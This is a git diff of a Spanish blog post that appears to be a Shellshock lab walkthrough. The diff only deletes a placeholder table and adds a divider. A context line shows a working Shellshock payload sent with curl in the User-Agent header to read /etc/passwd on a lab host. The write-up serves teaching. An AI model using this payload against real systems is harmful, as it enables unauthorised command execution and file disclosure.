@@ -81,11 +81,6 @@ Si nos dirigimos al navegador nos muestra la pagina por defecto de apache.
 
 
 Aplicaremos fuzzing a la pagina web para ver que con cosas interesantes nos podemos topar para ello haré uso de la utilidad de dirsearch que lo puedes descargar de [aquí](https://github.com/maurosoria/dirsearch).
-|columna 1 | columan 2 | columna 3 |
-|----------|:----------|:----------|
-|fila1     |elemento 1 |manzana    |
-|fila2     |elemento 2 |pera       |
-|fila3     |elemento 3 |granadilla |
 
 <p align="center">
 <img src="/assets/images/shellshock/7.PNG">
@@ -109,6 +104,8 @@ curl -A "() { foo;};echo;/bin/cat /etc/passwd" "http://172.17.0.2/cgi-bin/shockm
 <p align="center">
 <img src="/assets/images/shellshock/10.PNG">
   </p>
+
+----
 
 ## Obteniendo una shell
 ```bash
